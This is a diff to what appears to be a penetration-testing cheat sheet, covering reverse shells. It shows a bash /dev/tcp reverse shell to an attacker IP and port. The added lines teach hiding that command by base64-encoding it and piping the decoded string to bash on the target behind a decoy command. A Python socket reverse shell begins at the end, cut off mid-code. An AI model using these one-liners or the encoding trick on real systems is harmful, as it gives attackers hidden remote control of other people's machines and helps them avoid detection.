@@ -549,6 +549,16 @@ http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
 `> bash -i >& /dev/tcp/IP/PORT 0>&1`
 
+- Evasion technique:
+
+On attakcer machine create encoded payload:
+
+1. `> echo "bash -i >& /dev/tcp/IP/PORT 0>&1" |base64`
+
+On target machine execute encoded payload:
+
+2. `> echo '"optional_harmless_command";echo "encoded_payload_string" |base64 -d | bash' > file_to_execute`
+
 #### reverse shell [py]
 	python -c 'import socket,subprocess,os;
 	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
